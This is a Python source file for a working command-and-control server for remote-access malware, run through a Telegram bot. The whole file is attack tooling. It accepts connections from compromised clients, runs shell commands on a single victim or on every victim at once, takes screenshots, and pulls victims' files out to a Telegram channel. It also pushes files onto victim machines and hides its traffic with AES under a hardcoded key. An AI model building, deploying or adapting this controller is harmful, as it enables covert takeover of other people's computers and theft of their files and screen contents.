import telebot
import sqlite3
import socket
import threading
import signal
import time
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from telebot.types import ChatPermissions

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
TOKEN = "REMOVED_TELEGRAM_TOKEN"
C2_CHANNEL_ID = "REMOVED_TELEGRAM_CHAT_ID"
C2_SERVER_IP = "0.0.0.0"
C2_SERVER_PORT = 9090
bot = telebot.TeleBot(TOKEN)

class ClientSession:

    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.ip = address[0]
        self.username = None
        self.os_version = None
        self.topic_id = None

    def send_command(self, command):
        try:
            self.socket.send(command.encode("utf-8"))
            response = self.socket.recv(4096).decode("utf-8").strip()
            return response if response else "[Sin respuesta]"
        except Exception as e:
            return f"[!] Error executing the command: {e}"

    def close(self):
        try:
            self.socket.close()
        except Exception as e:
            print(f"[!] Error closing the connection with {self.ip}: {e}")

class C2Server:

    def __init__(self):
        self.clients = {}
        self.active_shell_sessions = {}
        self.server = None

        signal.signal(signal.SIGINT, self.shutdown)
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect("c2.db")
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS clients (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            telegram_id TEXT,
                            ip TEXT,
                            username TEXT,
                            topic_id INTEGER)''')
        conn.commit()
        conn.close()

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((C2_SERVER_IP, C2_SERVER_PORT))
        self.server.listen(5)
        print(f"[C2] Servidor esperando conexiones en {C2_SERVER_IP}:{C2_SERVER_PORT}...")
        bot.send_message(C2_CHANNEL_ID, f"🚀 C2 Server Started at {C2_SERVER_IP}:{C2_SERVER_PORT} 🚀\n\n" 
                    f"ℹ️ *Global Commands* ℹ️\n"
                    f"- */shutdown* - Shut down server\n"
                    f"- */sendall* <command> - Execute in the command in all the clients\n"
                    f"- */statusall* - Check status for every client\n",
        parse_mode="Markdown")

        while True:
            try:
                client_socket, client_address = self.server.accept()
                print(f"[+] New connection {client_address}")
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True)
                client_thread.start()
            except Exception as e:
                print(f"[C2] Error with the connection: {e}")

    def handle_client(self, client_socket, client_address):
        try:
            session = ClientSession(client_socket, client_address)

            data = client_socket.recv(1024).decode("utf-8")
            if not data:
                session.close()
                return

            info = data.split("|")
            session.username, session.os_version = info[0], info[1]

            conn = sqlite3.connect("c2.db")
            cursor = conn.cursor()
            topic_title = f"Cliente {session.username} ({session.ip})"
            response = bot.create_forum_topic(C2_CHANNEL_ID, topic_title)
            session.topic_id = response.message_thread_id

            cursor.execute("INSERT INTO clients (telegram_id, ip, username, topic_id) VALUES (?, ?, ?, ?)",
                           (session.ip, session.ip, session.username, session.topic_id))
            conn.commit()
            conn.close()

            self.clients[session.ip] = session

            help_message = (
                "ℹ️ *Client commands:*\n"
                "- `/delete` - Delete topic\n"
                "- `/status` - Check if the client is online\n"
                "- `/shell <command>` - Execute command in the client\n"
                "- `/screenshot` - Take a screenshot and send it here\n"
                "- `/download <file_path>` - Download a file from the client\n"
                "- `/upload <file_path>` - Upload a file to the client\n"
            )

            bot.send_message(C2_CHANNEL_ID, f"ℹ️ *New client connected* ℹ️\n"
                                            f"- *User:* {session.username}\n"
                                            f"- *IP:* {session.ip}\n"
                                            f"- *OS:* {session.os_version}\n"
                                            f"- *Topic:* {topic_title}",
                             parse_mode="Markdown")
            

            bot.send_message(C2_CHANNEL_ID, help_message, parse_mode="Markdown", message_thread_id=session.topic_id)

        except Exception as e:
            print(f"Error with the client {client_address}: {e}")

    def handle_command(self, message):

        if message.message_thread_id is None:
            self.handle_global_command(message)
            return

        conn = sqlite3.connect("c2.db")
        cursor = conn.cursor()
        cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
        client = cursor.fetchone()
        conn.close()
        
        if not client:
            return
        
        client_ip = client[0]
        text = message.text.lower()

        if text == "/status":
            self.check_bot_status(client_ip, message.message_thread_id)
            return

        elif text.startswith("/shell"):
            command = text.replace("/shell ", "")
            self.send_command_to_client(self.clients[client_ip], command, message.message_thread_id)

        elif text == "/delete":
            bot.delete_forum_topic(C2_CHANNEL_ID, message.message_thread_id)

        elif text == "/screenshot":
            self.send_command_to_client(self.clients[client_ip], "screenshot", message.message_thread_id)

        elif text.startswith("/download"):
            file = text.replace("/download ", "")
            self.send_command_to_client(self.clients[client_ip], f"download {file}", message.message_thread_id)

        elif text.startswith("/upload"):
            bot.send_message(C2_CHANNEL_ID, "📁 File uploading...", message_thread_id=message.message_thread_id)
            self.send_file(self.clients[client_ip], text.replace("/upload ", ""))

    def handle_global_command(self, message):
        text = message.text.lower()

        if text == "/shutdown":
            self.shutdown_server()

        elif text.startswith("/sendall"):
            self.sendall(text)

        elif text == "/statusall":
            self.statusall()

    def statusall(self):
        to_remove = []

        for ip, session in self.clients.items():
            try:
                response = self.execute_shell_command(session, "whoami")
                if response and response != "[Sin respuesta]":
                    bot.send_message(C2_CHANNEL_ID, f"[{ip}] ✅ ONLINE")
                else:
                    bot.send_message(C2_CHANNEL_ID, f"[{ip}] ❌ NO RESPONSE")

            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
                bot.send_message(C2_CHANNEL_ID, f"[{ip}] ❌ DISCONNECTED")
                print(f"[!] Client {ip} disconnected: {e}")
                session.close()
                to_remove.append(ip)

            except Exception as e:
                bot.send_message(C2_CHANNEL_ID, f"[{ip}] ⚠️ Error: {e}")

        for ip in to_remove:
            del self.clients[ip]

    def shutdown_server(self):
        bot.send_message(C2_CHANNEL_ID, "[!] Shutting down the sever...")
        import os, signal
        os.kill(os.getpid(), signal.SIGINT)

    def send_file(self, client_socket, file):
        try:
            if os.path.exists(file):
                with open(file, "rb") as f:
                    content = f.read()
                    encoded = base64.b64encode(content).decode("utf-8")
                    encrypted = self.encrypt_message(f"[upload] {encoded}")
            else:
                encrypted = self.encrypt_message(f"[!] The file {file} does not exist.")
            client_socket.socket.send(encrypted)
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"[!] Error sending the file: {e}")

    def sendall(self, text):
        command = text.replace("/sendall ", "")
        for ip, session in self.clients.items():
            try:
                response = self.execute_shell_command(session, command)
                bot.send_message(C2_CHANNEL_ID, f"[{ip}]\n{response}")
            except Exception as e:
                bot.send_message(C2_CHANNEL_ID, f"[{ip}] Error: {e}")

    def check_bot_status(self, client_ip, message_thread_id):
        session = self.clients.get(client_ip)

        if not session:
            bot.send_message(C2_CHANNEL_ID, "[!] Client not found", message_thread_id=message_thread_id)
            return

        try:
            response = self.execute_shell_command(session, "whoami")

            if response and response != "[Sin respuesta]":
                bot.send_message(C2_CHANNEL_ID, "[+] Client *ONLINE*", message_thread_id=message_thread_id, parse_mode="Markdown")
            else:
                bot.send_message(C2_CHANNEL_ID, "[!] Client *NO RESPONSE*", message_thread_id=message_thread_id, parse_mode="Markdown")

        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
            bot.send_message(C2_CHANNEL_ID, f"[!] Client *DISCONNECTED*", message_thread_id=message_thread_id, parse_mode="Markdown")
            print(f"[!] Client {client_ip} disconnected: {e}")
            session.close()
            del self.clients[client_ip]

        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"[!] Error checking client status: {e}", message_thread_id=message_thread_id)


    def execute_shell_command(self, client_socket, command):
        encrypted_command = self.encrypt_message(command)
        client_socket.socket.send(encrypted_command)
        encrypted_response = self.recv_all(client_socket.socket)
        response = self.decrypt_message(encrypted_response).strip()
        return response if response else "[Sin respuesta]"


    def send_command_to_client(self, client_socket, command, topic_id):
        try:
            encrypted_command = self.encrypt_message(command)
            client_socket.socket.send(encrypted_command)
            
            response = self.recv_all(client_socket.socket).strip()
            response = self.decrypt_message(response.encode()).strip()

            if response.startswith("[screenshot]"):
                self.recv_img(response, topic_id)

            elif response.startswith("[download]"):
                self.recv_file(response, topic_id)

            elif response == "[File uploaded]":
                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)

            elif response == "[Error uploading file]":
                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)

            else:
                if len(response) > 4000:
                    response = response[:4000] + "\n[...truncated]"
                bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
        except Exception as e:
            bot.send_message(C2_CHANNEL_ID, f"[!] Error executing the command: {e}", message_thread_id=topic_id)

    def recv_file(self, response, topic_id):
        file_data = response.replace("[download]", "")
        file_bytes = base64.b64decode(file_data)

        with open("downloaded_file", "wb") as f:
            f.write(file_bytes)

        with open("downloaded_file", "rb") as file:
            bot.send_document(C2_CHANNEL_ID, file, caption="📁 File received", message_thread_id=topic_id)
            os.remove("downloaded_file")

    def recv_img(self, response, topic_id):
        image_data = response.replace("[screenshot]", "")
        image_bytes = base64.b64decode(image_data)

        with open("screenshot.png", "wb") as f:
            f.write(image_bytes)

        with open("screenshot.png", "rb") as photo:
            bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Screenshot received", message_thread_id=topic_id)
            os.remove("screenshot.png")

    def recv_all(self, sock):
        size_data = b""
        while len(size_data) < 10:
            part = sock.recv(10 - len(size_data))
            if not part:
                break
            size_data += part

        total_size = int(size_data.decode("utf-8"))

        data = b""
        while len(data) < total_size:
            part = sock.recv(min(4096, total_size - len(data)))
            if not part:
                break
            data += part

        return data.decode("utf-8", errors="ignore")

    def encrypt_message(self, message: str) -> bytes:
        iv = os.urandom(16)
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
        return base64.b64encode(iv + encrypted)

    def decrypt_message(self, encrypted_message: bytes) -> str:
        try:
            raw = base64.b64decode(encrypted_message)
            iv = raw[:16]
            encrypted = raw[16:]
            cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
            return decrypted.decode()
        except Exception as e:
            return f"[!] Error decrypting message: {e}"


    def shutdown(self, sig, frame):
        print("\n[!] Shuting Down the server...")
        if self.server:
            self.server.close()
        for session in self.clients.values():
            session.close()
        bot.stop_polling()
        exit(0)

if __name__ == "__main__":
    try:
        c2 = C2Server()
        bot.message_handler(func=lambda message: True)(c2.handle_command)
        threading.Thread(target=c2.start_server, daemon=True).start()
        bot.polling()
    except Exception as e:
        print(f"[!] Error: {e}")